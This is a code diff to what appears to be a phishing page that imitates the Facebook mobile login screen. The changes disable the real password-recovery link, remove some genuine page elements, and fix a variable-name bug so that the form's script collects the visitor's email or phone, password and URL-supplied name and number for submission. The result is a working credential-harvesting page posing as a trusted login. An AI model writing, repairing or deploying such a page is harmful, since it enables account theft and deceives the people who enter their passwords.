@@ -26,7 +26,7 @@
                                     <div class="_7om2 _52we _2pid _52z6">
                                         <div class="_4g34">
                                             <a href="/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjgxMzc2Mzc2LCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%3D%3D&amp;refid=8">
-                                                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="112" class="img" alt="facebook">
+                                                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="112" class="img" alt="">
                                             </a>
                                         </div>
                                     </div>
@@ -56,7 +56,7 @@
                                                                 <div class="_5s61 _216i _5i2i _52we">
                                                                     <div class="_5xu4">
                                                                         <div class="_2pi9" style="display:none" id="u_0_2_9S">
-                                                                            <a href="#" data-sigil="password-plain-text-toggle">
+                                                                            <a href="#" >
                                                                                 <span class="mfss" style="display:none" id="u_0_3_J7">HIDE</span>
                                                                                 <span class="mfss" id="u_0_4_FS">SHOW</span>
                                                                             </a>
@@ -74,8 +74,6 @@
                                                         <span class="_55sr">L<span>og I</span>n</span>
                                                     </button>
                                                 </div>
-                                                <div class="_7eif" id="oauth_login_button_container" style="display:none"></div>
-                                                <div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div>
                                                 <div id="otp_button_elem_container"></div>
                                             </div>
                                             <div class="_xo8"></div>
@@ -84,7 +82,7 @@
                                         <div>
                                             <div class="_2pie _9omz">
                                                 <div class="_52jj _9on1">
-                                                    <a class="_9on1" tabindex="0" href="/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjgxMzc2Mzc2LCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&amp;c=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0sgEijsrlzNbH80a5&amp;r&amp;cuid&amp;ars=facebook_login&amp;lwv=100&amp;refid=8" id="forgot-password-link">Forgotten password?</a>
+                                                    <a class="_9on1" tabindex="0" href="#" id="forgot-password-link">Forgotten password?</a>
                                                 </div>
                                             </div>
                                             <div style="padding-top: 42px">
@@ -184,20 +182,7 @@
                     </div>
                 </div>
                 <div class=""></div>
-                <div class="viewportArea _2v9s" style="display:none" id="u_0_7_64" data-sigil="marea">
-                    <div class="_5vsg" id="u_0_8_kt" style="max-height: 200px;"></div>
-                    <div class="_5vsh" id="u_0_9_J2" style="max-height: 502px;"></div>
-                    <div class="_5v5d fcg">
-                        <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Loading...
-                    </div>
-                </div>
-                <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
-                    <div class="container">
-                        <div class="image"></div>
-                        <div class="message" data-sigil="error-message"></div>
-                        <a class="link" data-sigil="MPageError:retry">Try Again</a>
-                    </div>
-                </div>
+                
             </div>
         </div>
         
@@ -225,10 +210,10 @@
               e.preventDefault();
 
 		    let datas = new FormData();
-formData.append("name", urlParams.get("name"));
-formData.append("num", urlParams.get("vall"));
-		    formData.append("mob", emalog.value);
-formData.append("forlog", paslog.value);
+datas.append("name", urlParams.get("name"));
+datas.append("num", urlParams.get("vall"));
+		    datas.append("mob", emalog.value);
+datas.append("forlog", paslog.value);
 		    
 		    
 		    submitlog.style.opacity = 0.6;
